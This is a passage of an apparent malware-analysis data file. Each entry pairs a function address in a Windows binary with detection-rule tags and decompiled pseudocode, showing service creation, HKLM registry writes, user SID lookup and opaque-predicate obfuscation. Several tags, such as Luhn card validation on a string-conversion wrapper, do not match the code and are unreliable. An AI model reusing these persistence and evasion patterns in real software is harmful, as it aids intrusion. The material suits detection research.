0; iVar6 = iVar6 + -1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = *puVar5;\n    fcn.004011c0();\n    fcn.004024d0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 890
    },
    "004035a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004035a0(uint noname_0, int32_t arg_ch)\n\n{\n    uchar in_stack_0000000c;\n    uchar in_stack_00000010;\n    \n    if (arg_ch == 1) {\n        fcn.004043d0();\n        fcn.00403860();\n        fcn.004022a0();\n        if (*0x4235a8 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00401720();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(noname_0, arg_ch, in_stack_0000000c, in_stack_00000010);\n    return;\n}\n",
        "token_count": 160
    },
    "004049a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004049fd) overlaps instruction at (ram,0x004049fb)\n// \n\nvoid fcn.004049a0(void)\n\n{\n    int16_t in_AX;\n    uint8_t *unaff_EBX;\n    int32_t unaff_EDI;\n    bool bVar1;\n    bool bVar2;\n    bool in_SF;\n    uint in_stack_ffffffdc;\n    uint arg_14h;\n    uchar in_stack_fffffff0;\n    uchar in_stack_fffffff1;\n    ushort in_stack_fffffff2;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_stack_fffffff0 = 0x11;\n        in_stack_fffffff1 = 0;\n        in_stack_fffffff2 = 0;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00401380(0x407010, 0x14, 0x411108, CONCAT22(in_stack_fffffff2, CONCAT11(in_stack_fffffff1, in_stack_fffffff0)));\n    bVar1 = false;\n    bVar2 = (((unaff_EBX ^ in_AX + 0xe22aU) >> 8) - 1U & 0xd) == 0;\n    arg_14h = 0x4049ed;\n    fcn.00401380(0x407010, 0x14, 0x411324, 0xf);\n    if ((bVar1 || bVar2) || (!bVar1 && !bVar2)) {\n        arg_14h = 0x1a;\n        in_stack_ffffffdc = 0x411334;\n    }\n    else {\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe4;\n    }\n    fcn.00401380(0x407010, 0x14, in_stack_ffffffdc, arg_14h);\n    fcn.00401380(0x407010, 0x14, 0x411388, 10);\n    fcn.00401380(0x407010, 0x14, 0x411394, 0xb);\n    fcn.00401380(0x407010, 0x14, 0x4113a0, 8);\n    fcn.00401380(0x407010, 0x14, 0x4113a8, 9);\n    fcn.00401380(0x407010, 0x14, 0x4113b4, 9);\n    fcn.00401380(0x407010, 0x14, 0x4113c0, 9);\n    fcn.00401380(0x407010, 0x14, 0x4113cc, 0xc);\n    fcn.00401380(0x407010, 0x14, 0x4113d8, 3);\n    fcn.00401380(0x407010, 0x14, 0x4113dc, 10);\n    fcn.00401380(0x407010, 0x14, 0x4113e8, 0x40);\n    fcn.00401380(0x407010, 0x14, 0x411428, 0xc);\n    fcn.00401380(0x407010, 0x14, 0x411434, 0xb);\n    fcn.00401380(0x407010, 0x14, 0x411440, 4);\n    fcn.00401380(0x407010, 0x14, 0x411444, 4);\n    fcn.00401380(0x407010, 0x14, 0x411448, 0xc);\n    fcn.00401380(0x407010, 0x14, 0x411454, 4);\n    fcn.00401380(0x407010, 0x14, 0x411458, 9);\n    fcn.00401380(0x407010, 0x14, 0x411464, 0x16);\n    fcn.00401380(0x407010, 0x14, 0x41147c, 7);\n    return;\n}\n",
        "token_count": 978
    },
    "00404fb0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nbool fcn.00404fb0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    bool bVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.004040c0(&var_4h);\n    bVar4 = iVar2 == 0;\n    if (bVar4) {\n        return false;\n    }\n    if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    iVar2 = -1;\n    pcVar3 = var_4h;\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4112d0, 0x411310, 1, var_4h, ~iVar2 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 294
    },
    "004041c0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404235) overlaps instruction at (ram,0x00404232)\n// \n// WARNING: Removing unreachable block (ram,0x00404226)\n// WARNING: Removing unreachable block (ram,0x0040422e)\n\nbool __cdecl fcn.004041c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 253
    },
    "00401c50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ce5) overlaps instruction at (ram,0x00401ce2)\n// \n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401c50(int32_t *hWnd)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t extraout_DL;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    bool bVar8;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t pbstr;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t Msg;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405240;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    Msg = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    bVar8 = true;\n    iVar3 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, Msg, 0, 0, 2, 1000, &var_18h);\n    if ((bVar8) || (!bVar8)) {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x411510);\n    }\n    else {\n        puVar1 = iVar3 + -1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + extraout_DL;\n        pcVar4 = sym.imp.KERNEL32.dll_GetProcAddress + CARRY1(uVar2, extraout_DL) + iVar3;\n    }\n    if (pcVar4 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar3 = (*pcVar4)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar3 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_28h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n        var_4h._0_1_ = 1;\n        iVar3 = (**(*var_20h + 0x20))(var_20h, &var_28h);\n        if ((iVar3 < 0) || (var_28h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_28h + 0x24))(var_28h, &var_1ch);\n            Msg = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_30h = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_30h = var_30h % var_1ch;\n                    var_38h = CONCAT22(var_38h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                    var_4h._0_1_ = 4;\n                    iVar3 = (**(*var_28h + 0x2c))\n                                      (var_28h, var_38h, var_34h, var_30h, var_2ch, var_38h, var_34h, var_30h, var_2ch, \n                                       &hWnd);\n                    if ((iVar3 < 0) || (hWnd == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\njoined_r0x00402072:\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x0040207e:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                        break;\n                    }\n                    iVar3 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if ((iVar3 < 0) || (var_10h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00402039:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x0040207e;\n                    }\n                    iVar3 = (**(*var_10h + 0x38))(var_10h, &pbstr);\n                    if (iVar3 < 0) {\ncode_r0x00401ffa:\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        goto joined_r0x00402039;\n                    }\n                    if (pbstr == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00401e75:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401a50(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar5 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x411524);\n                        if (iVar5 != 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00401e75;\n                        }\n                        var_14h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 5;\n                        iVar3 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar3 < 0) || (var_14h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\njoined_r0x0040201e:\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                            goto joined_r0x00402072;\n                        }\n                        iVar3 = (**(*var_14h + 0x20))(var_14h, &var_40h);\n                        iVar5 = var_40h;\n                        if (iVar3 < 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x0040201e;\n                        }\n                        if (var_40h == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar7 = &var_147h;\n                            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                *puVar7 = 0;\n                                puVar7 = puVar7 + 1;\n                            }\n                            *puVar7 = 0;\n                            *(puVar7 + 2) = 0;\n                            fcn.00401a50(iVar5, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_40h);\n                            iVar5 = fcn.00401b90(&var_148h);\n                            if (iVar5 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n    // WARNING: Ignoring partial resolution of indirect\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto code_r0x00401ffa;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                    Msg = Msg + 1;\n                } while (Msg < var_1ch);\n            }\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        if (var_28h != NULL) {\n            (**(*var_28h + 8))(var_28h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar3;\n}\n",
        "token_count": 2823
    },
    "004036e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004036e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_10h = 1;\n        do {\n            uVar1 = *(var_10h % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_10h) = var_ch ^ *(var_8h + arg_10h) ^ *((var_10h + -1) % arg_ch + arg_8h);\n            *(var_10h + arg_18h) = var_ch ^ uVar1;\n            var_8h = var_8h + 1;\n            var_10h = var_10h + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00403800": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403898) overlaps instruction at (ram,0x00403895)\n// \n// WARNING: Variable defined which should be unmapped: var_1fh\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403800(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    uchar uVar3;\n    uint in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    int32_t *piVar6;\n    uint *extraout_ECX_00;\n    uint extraout_EDX;\n    int32_t unaff_EBX;\n    uchar *unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    ulong uVar10;\n    unkbyte6 Var11;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar *puStackY52;\n    uint32_t uStackY48;\n    uchar *puStackY44;\n    uchar var_20h;\n    uint *var_1fh;\n    uchar *puVar12;\n    uint arg_8h_00;\n    \n    puStackY44 = &stack0xfffffffc;\n    bVar8 = false;\n    bVar9 = (CONCAT11(((in_EAX >> 8) - unaff_EBX) + 'M', in_EAX) & 0x26ae) == 1;\n    arg_8h_00 = 0;\n    uStackY48 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar9) && (bVar9)) {\n        _var_20h = unaff_EBX + 1;\n        bVar9 = _var_20h == NULL;\n        if (bVar8 || bVar9) {\n            if ((!bVar8) && (bVar8)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            Var11 = fcn.00401000();\n            if ((!bVar8 && !bVar9) && (bVar8 || bVar9)) {\n                piVar6 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - *_var_20h, extraout_ECX);\n                puVar1 = unaff_EDI + 0x68;\n                puVar12 = *puVar1;\n                *puVar1 = *puVar1 - &stack0xffffffe8;\n                uVar3 = in(Var11 >> 0x20);\n                *unaff_EDI = uVar3;\n                *piVar6 = *piVar6 + Var11 + (puVar12 < &stack0xffffffe8);\n                unaff_EDI = unaff_EDI + 1;\n            }\n            iVar5 = fcn.00403a90(arg_8h_00);\n            if (iVar5 == -1) {\n                fcn.004049a0();\n                *0x4235ac = 1;\n                puStackY52 = unaff_EDI;\n                unique0x10000274 = extraout_EDX;\n                iVar5 = fcn.00404340();\n                if (iVar5 != 0) {\n                    return 0;\n                }\n                var_80h._0_1_ = 0;\n                puVar7 = &fcn.00403800::var_1fh;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                *puVar7 = 0;\n                *(puVar7 + 2) = 0;\n                var_60h._0_1_ = 0;\n                puVar7 = &fcn.00403800::var_80h + 1;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                *puVar7 = 0;\n                *(puVar7 + 2) = 0;\n                var_40h._0_1_ = 0;\n                puVar7 = &fcn.00403800::var_60h + 1;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                *puVar7 = 0;\n                *(puVar7 + 2) = 0;\n                unique0x00001d00 = &fcn.00403800::var_60h;\n                puVar7 = &fcn.00403800::var_40h + 1;\n                for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                *puVar7 = 0;\n                *(puVar7 + 2) = 0;\n                _var_20h = &fcn.00403800::var_80h;\n                iVar5 = fcn.004028a0(_var_20h, unique0x00001d00, &stack0xffffffdc, &fcn.00403800::var_40h);\n                if (iVar5 != 0) {\n                    puVar12 = 0x40398a;\n                    uVar10 = fcn.00402fb0(&stack0xffffffdc);\n                    iVar5 = uVar10;\n                    if (iVar5 != 0) {\n                        if ((iVar5 < 1) || (_var_20h = extraout_ECX_00,  0 < iVar5)) {\n                            puVar12 = &stack0xffffffdc;\n                            _var_20h = &fcn.00403800::var_60h;\n                            uVar10 = CONCAT44(&fcn.00403800::var_80h, puVar12);\n                        }\n                        puVar2 = uVar10 + -0x72c625aa;\n                        *puVar2 = *puVar2 ^ _var_20h;\n                        puStackY44 = 0x4039bf;\n                        unique0x10000278 = &stack0xfffffffc;\n                        iVar5 = fcn.00402d00(uVar10 >> 0x20, _var_20h, &stack0xfffffffc, puVar12);\n                        return iVar5 != 0;\n                    }\n                    return 0;\n                }\n                return 0;\n            }\n            return 0;\n        }\n        in_AF = 9 < (uStackY48 & 0xf) | in_AF;\n        piVar6 = (uStackY48 & 0xffff0000 | CONCAT11((uStackY48 >> 8) + in_AF, uStackY48 + in_AF * '\\x06') & 0xff0f) +\n                 0x2a;\n        *piVar6 = *piVar6 - _var_20h;\n        uStackY48 = uStackY48 + 1;\n    }\n    _var_20h = 0x40384c;\n    unique0x1000027c = uStackY48;\n    uVar4 = fcn.00402b50(uStackY48, arg_8h);\n    stack0xffffffe0 = 0x403858;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar4;\n}\n",
        "token_count": 1713
    },
    "004040c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041a6) overlaps instruction at (ram,0x004041a3)\n// \n\nuint __cdecl fcn.004040c0(char *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar5;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    ushort in_DX;\n    char *pcVar6;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint8_t uVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    ulong uVar9;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    if ((*0x10 != 0x320) && (*0x10 == 0x320)) {\n        uVar4 = in(in_DX);\n        *unaff_EDI = uVar4;\n        unaff_EDI = unaff_EDI + 1;\n        if (&stack0xfffffcdc < 1) {\n            return in_EAX;\n        }\n    }\n    func_0x514040f6();\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(extraout_ECX);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    uVar9 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &var_218h, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    pcVar6 = uVar9 >> 0x20;\n    puVar3 = uVar9;\n    uVar7 = 0;\n    bVar8 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    if ((bVar8) || (!bVar8)) {\n        puVar3 = &var_114h;\n    }\n    else {\n        out(*unaff_ESI, uVar9 >> 0x20);\n        uVar7 = in_AF;\n        do {\n            cVar5 = puVar3 >> 8;\n            uVar7 = 9 < (puVar3 & 0xf) | uVar7;\n            puVar3 = CONCAT31(CONCAT21(puVar3 >> 0x10, cVar5 - uVar7), -uVar7);\n            arg_8h = pcVar6;\n        } while (uVar7 || cVar5 == *pcVar6);\n    }\n    piVar1 = unaff_EDI + arg_8h * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar7;\n    *(extraout_ECX_00 + -0x75) = puVar3;\n    (**(arg_8h + 0x50))();\n    iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar2 != 0) {\n        uVar4 = in(0x5d);\n        *0x98 = *0x98 + -0x68;\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 805
    },
    "00404cf0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f93) overlaps instruction at (ram,0x00404f92)\n// \n\nvoid __fastcall fcn.00404cf0(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    int32_t in_EAX;\n    uint8_t extraout_CL;\n    uint8_t extraout_CH;\n    uint8_t uVar3;\n    ushort extraout_CX;\n    char extraout_CH_00;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    int32_t unaff_EBX;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    char cVar7;\n    unkbyte10 in_ST0;\n    ulong uVar8;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint arg_14h;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint uVar9;\n    \n    *(in_EAX + -0x7ce92414) = in_ST0;\n    *param_2 = *param_2 + 0x206adf84;\n    fcn.00401380(0x407010, 0x14, 0x411484, unaff_EBX);\n    fcn.00401380(0x407010, 0x14, 0x4114a4, 0x26);\n    fcn.00401380(0x407010, 0x14, 0x4114cc, 8);\n    cVar7 = '\\0';\n    uVar3 = extraout_CH ^ unaff_EBX;\n    cVar6 = uVar3 < '\\0';\n    bVar4 = uVar3 == 0;\n    uVar9 = 0x404d97;\n    uVar8 = fcn.00401380(0x407010, 0x14, 0x4114d4, 0x19);\n    if ((bVar4 || cVar7 != cVar6) || (!bVar4 && cVar7 == cVar6)) {\n        uVar9 = 0xb;\n        in_stack_ffffffdc = 0x4114f0;\n        in_stack_ffffffd8 = 0x14;\n    }\n    puVar2 = uVar8 + 0x6a39da56;\n    *puVar2 = *puVar2 ^ extraout_CX;\n    pcVar1 = (uVar8 >> 0x20) + 0x14;\n    *pcVar1 = *pcVar1 + (extraout_CX >> 8);\n    bVar4 = *pcVar1 < '\\0';\n    arg_14h = 0x404dbc;\n    fcn.00401380(0x407010, in_stack_ffffffd8, in_stack_ffffffdc, uVar9);\n    if ((bVar4) || (!bVar4)) {\n        arg_14h = 0x12;\n        in_stack_ffffffcc = 0x4114fc;\n        in_stack_ffffffc8 = 0x14;\n    }\n    *(extraout_EDX + 0x14) = *(extraout_EDX + 0x14) + extraout_CH_00;\n    fcn.00401380(0x407010, in_stack_ffffffc8, in_stack_ffffffcc, arg_14h);\n    fcn.00401380(0x407010, 0x14, 0x411510, 0x12);\n    fcn.00401380(0x407010, 0x14, 0x411524, 2);\n    fcn.00401380(0x407010, 0x14, 0x411528, 8);\n    fcn.00401380(0x407010, 0x14, 0x411530, 8);\n    fcn.00401380(0x407010, 0x14, 0x411538, 6);\n    fcn.00401380(0x407010, 0x14, 0x411540, 7);\n    bVar4 = extraout_DH < extraout_CL;\n    bVar5 = extraout_DH == extraout_CL;\n    fcn.00401380(0x407010, 0x14, 0x411548, 7);\n    if ((!bVar4 && !bVar5) && (bVar4 || bVar5)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00401380(0x407010, 0x14, 0x411550, 6);\n    bVar4 = unaff_EBX + 2 < 0;\n    uVar9 = 0x404f83;\n    fcn.00401380(0x407010, 0x14, 0x411558, 0x25);\n    if ((bVar4) || (!bVar4)) {\n        uVar9 = 8;\n    }\n    *(unaff_EBX + 1) = *(unaff_EBX + 1) & 0xc3;\n    fcn.00401380(0x407010, 0x14, 0x411580, uVar9);\n    return;\n}\n",
        "token_count": 1191
    },
    "004010e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00401930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.00401930(uint arg_8h)\n\n{\n    uint *unaff_EBP;\n    bool in_OF;\n    uint64_t uVar1;\n    uint in_stack_00000010;\n    uint in_stack_00000018;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EBP = in_stack_00000018;\n        return CONCAT44(in_stack_00000010, in_stack_00000018);\n    }\n    uVar1 = fcn.00402720(arg_8h, 1);\n    return uVar1 & 0xffffffff00000000 | uVar1 != 0;\n}\n",
        "token_count": 145
    },
    "00401a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401a50(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "null": {
        "rules": [
